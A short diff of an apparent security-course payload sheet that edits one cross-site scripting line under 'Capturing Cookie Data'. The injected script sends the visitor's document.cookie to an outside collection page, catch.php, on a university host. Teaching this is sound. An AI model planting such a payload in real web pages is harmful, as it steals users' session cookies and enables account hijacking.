@@ -8,7 +8,7 @@ Redirection:
 
 Capturing Cookie Data:
 ----------------------
-<script> new Image().src="http://pawn.hss.cmu.edu/~hacker/catch.php?name=<YOUR NAME HERE>&cookie="+encodeURI(document.cookie); </script>
+<script> new Image().src="http://pawn.hss.cmu.edu/~hacker/catch.php?andrewid=YOUR_NAME_HERE&cookie="+encodeURI(document.cookie); </script>
 
 Login Data Capture:
 --------------------
